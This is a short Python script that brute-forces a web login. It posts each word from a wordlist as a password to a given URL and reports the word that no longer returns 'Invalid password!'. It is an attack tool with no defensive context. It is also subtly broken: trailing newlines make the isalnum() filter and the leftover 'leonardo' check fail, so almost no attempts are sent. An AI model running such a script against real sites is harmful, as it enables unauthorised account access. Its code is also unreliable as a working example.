import requests, sys

if (len(sys.argv) != 3):
    print('python3 name url wordlist')
    sys.exit()

with open(sys.argv[2], encoding='latin-1') as word_list:
    for line in word_list:
        if line == 'leonardo':
            print('leonardo is here')
        if line.isalnum():
            response = requests.post(sys.argv[1], data={'password':line}).text
            if(response.split('\n')[0] != 'Invalid password!'):
                print('Got it! the pass is: '+line)
                sys.exit()
            print(line.strip()+'\t\t is an '+response.split('\n')[0])
